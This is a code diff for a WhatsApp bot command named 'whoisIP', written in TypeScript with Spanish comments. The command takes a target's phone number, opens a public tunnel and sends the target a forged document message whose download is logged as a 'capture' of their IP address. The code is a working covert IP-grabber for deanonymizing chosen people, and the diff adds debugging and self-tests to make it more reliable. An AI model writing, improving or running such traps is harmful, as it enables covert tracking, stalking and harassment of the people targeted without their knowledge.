@@ -87,26 +87,44 @@ export default {
   groupOnly: false,
   async run(ctx: CommandContext) {
     const { reply, react, msg, args, sock, from, groupMeta } = ctx;
-    const paso = (t: string) => console.log(`[whoisIP] ${t}`);
+    const log = (t: string) => console.log(`[whoisIP] ${t}`);
 
+    let diag: any = null;
     try {
-      paso(`inicio, from=${from}`);
+      // PASO 0: prueba de vida inmediata
+      await react("🧪").catch(() => undefined);
+      diag = await sock.sendMessage(from, { text: "🧪 *whoisIP v4* cargado, arrancando…" }).catch(() => null);
+      log("v4 arrancado");
 
+      const sub = (args[0] ?? "").toLowerCase().replace(/\D/g, "");
+      const modo = /^ping$/.test((args[0] ?? "").toLowerCase())
+        ? "ping"
+        : /^test$/.test((args[0] ?? "").toLowerCase())
+          ? "test"
+          : "run";
+
+      if (modo === "ping") {
+        return reply("🟢 vivo. El archivo correcto está cargado y ejecutándose.");
+      }
+
+      if (modo === "test") {
+        const base = await ensurePublicBase();
+        const prueba = await fetch(`${base}/__ping`, { signal: AbortSignal.timeout(10000) })
+          .then(async (r) => `${r.status} · ${(await r.text()).slice(0, 40)}`)
+          .catch((e) => `error: ${e?.message}`);
+        return reply(`🧪 Túnel: ${base}\nProbe: ${prueba}`);
+      }
+
+      // PASO 1: resolver objetivo
       const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
       let raw = "";
       if (contextInfo?.mentionedJid?.length) raw = contextInfo.mentionedJid[0];
       else if (contextInfo?.participant) raw = contextInfo.participant;
       else if (args.length) raw = args.join("");
-      const modoTest = args.some((a) => /^test$/i.test(a.replace(/\D/g, "")));
-
-      if (modoTest) {
-        await react("🧪").catch(() => undefined);
-        const base = await ensurePublicBase();
-        return reply(`🧪 Túnel activo:\n${base}\n\nAbre esa URL en el navegador y debería responder *pong*.`);
-      }
+      log(`raw=${raw}`);
 
       if (!raw) return reply("⚠️ Uso: *whoisIP +573118353868* — o etiqueta / responde a alguien.");
-      if (hasActiveSession(from)) return reply("⏳ Ya hay un *whoisIP* activo en este chat. Espera a que expire.");
+      if (hasActiveSession(from)) return reply("⏳ Ya hay un *whoisIP* activo en este chat.");
 
       const isLid = raw.endsWith("@lid");
       let digits = raw.split("@")[0].split(":")[0].replace(/\D/g, "");
@@ -123,38 +141,38 @@ export default {
         digits = realPhone;
         targetJid = `${realPhone}@s.whatsapp.net`;
       }
-      if (!digits || digits.length < 7) return reply("⚠️ No pude resolver un número válido. Escríbelo manual: *whoisIP +573118353868*.");
+      if (!digits || digits.length < 7) return reply("⚠️ No pude resolver un número. Escríbelo: *whoisIP +573118353868*.");
+      log(`target=${digits} jid=${targetJid}`);
 
-      paso(`target=${digits}`);
-      await react("🔎").catch(() => undefined);
-
+      // PASO 2: existe en WhatsApp
       if (!isLid) {
-        const check = await sock.onWhatsApp(targetJid).catch(() => null);
-        paso(`onWhatsApp=${JSON.stringify(check)}`);
-        if (!check?.[0]?.exists) {
-          await react("❌").catch(() => undefined);
-          return reply(`❌ \`+${digits}\` no está registrado en WhatsApp.`);
-        }
+        const check = await sock.onWhatsApp(targetJid).catch((e: any) => {
+          log(`onWhatsApp error: ${e?.message}`);
+          return null;
+        });
+        log(`onWhatsApp=${JSON.stringify(check)}`);
+        if (!check?.[0]?.exists) return reply(`❌ \`+${digits}\` no está registrado en WhatsApp.`);
       }
 
+      // PASO 3: imagen
       const pushName = participant?.name || participant?.notify || (contextInfo?.participant === targetJid ? msg.pushName : null) || `+${digits}`;
-
       let plain: Buffer | null = null;
       try {
         const pp = await sock.profilePictureUrl(targetJid, "image");
-        paso(`pp=${pp ? "si" : "no"}`);
+        log(`pp=${pp ? "si" : "no"}`);
         if (pp) {
           const r = await fetch(pp, { signal: AbortSignal.timeout(9000) });
           if (r.ok) plain = Buffer.from(await r.arrayBuffer());
         }
-      } catch {}
-
+      } catch (e: any) {
+        log(`pp error: ${e?.message}`);
+      }
       if (!plain) {
         const local = FALLBACKS.find((p) => existsSync(p));
         if (local) {
           try {
             plain = await readFile(local);
-            paso(`fallback local ${local}`);
+            log(`fallback ${local}`);
           } catch {}
         }
       }
@@ -168,8 +186,25 @@ export default {
         } catch {}
       }
       if (!plain) plain = Buffer.from(PLACEHOLDER, "base64");
-      paso(`imagen=${plain.length} bytes`);
+      log(`imagen ${plain.length}b`);
 
+      // PASO 4: túnel
+      const base = await ensurePublicBase().catch((e: any) => {
+        log(`tunel error: ${e?.message}`);
+        return null;
+      });
+      if (!base) {
+        await react("❌").catch(() => undefined);
+        return reply(
+          `❌ *Sin túnel público*\n\n` +
+          `El hosting no dejó abrir localtunnel ni tunnelmole.\n\n` +
+          `En la consola: \`npm i localtunnel tunnelmole\` y reinicia.\n` +
+          `O define \`TRAP_BASE_URL\` con un dominio propio.`
+        );
+      }
+      log(`base=${base}`);
+
+      // PASO 5: sesión + autotest
       const session = await createSession({
         plain,
         fileName: `foto_${digits.slice(-4)}.jpg`,
@@ -181,26 +216,21 @@ export default {
         onExpire: async (s) => {
           await sock
             .sendMessage(s.chatJid, {
-              text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó el archivo en ${Math.round(TRAP_TTL_MS / 1000)}s.`,
+              text: `⌛ *${fytBold("whoisIP")}* sin captura: \`+${s.targetPhone}\` no descargó en ${Math.round(TRAP_TTL_MS / 1000)}s.`,
             })
             .catch(() => undefined);
         },
       });
-      paso(`sesion ${session.id} url=${sessionUrl(session)}`);
 
       const test = await selfTest(session);
-      paso(`selftest=${JSON.stringify(test)}`);
+      log(`selftest=${JSON.stringify(test)}`);
       if (!test.ok) {
         closeSession(session);
         await react("❌").catch(() => undefined);
-        return reply(
-          `❌ *El túnel no sirve el archivo*\n\n` +
-          `Motivo: ${test.reason}\n` +
-          `URL: ${sessionUrl(session)}\n\n` +
-          `Prueba \`whoisIP test\` o define \`TRAP_BASE_URL\` con un dominio propio.`
-        );
+        return reply(`❌ El túnel no sirve el archivo: *${test.reason}*\n${sessionUrl(session)}`);
       }
 
+      // PASO 6: envío
       const messageId = "3EB0" + randomBytes(8).toString("hex").toUpperCase();
       const docMsg = buildDocumentMessage(
         session,
@@ -208,19 +238,22 @@ export default {
         { stanzaId: msg.key.id, participant: msg.key.participant ?? msg.key.remoteJid ?? undefined, remoteJid: from }
       );
 
-      paso("enviando documento");
-      if (typeof (sock as any).relayMessage === "function") {
-        await (sock as any).relayMessage(from, docMsg, { messageId });
-      } else {
-        await sock.sendMessage(from, docMsg as any, { messageId } as any);
+      log(`relayMessage=${typeof (sock as any).relayMessage}`);
+      if (typeof (sock as any).relayMessage !== "function") {
+        return reply("❌ `sock.relayMessage` no existe en esta versión de Baileys.");
       }
 
-      paso("documento enviado");
+      await (sock as any).relayMessage(from, docMsg, { messageId });
+      log("relay OK");
+
       await react("📡").catch(() => undefined);
+      if (diag?.key?.id) {
+        await sock.sendMessage(from, { text: "✅ documento enviado (si no lo ves, el servidor lo descartó)" }, { quoted: diag }).catch(() => undefined);
+      }
     } catch (e: any) {
-      paso(`ERROR: ${e?.stack ?? e}`);
+      log(`ERROR ${e?.stack ?? e}`);
       await react("❌").catch(() => undefined);
-      await reply(`❌ *whoisIP* falló:\n\`${String(e?.message ?? e).slice(0, 300)}\``).catch(() => undefined);
+      await reply(`❌ *whoisIP* explotó:\n\`${String(e?.stack ?? e?.message ?? e).slice(0, 400)}\``).catch(() => undefined);
     }
   },
 };
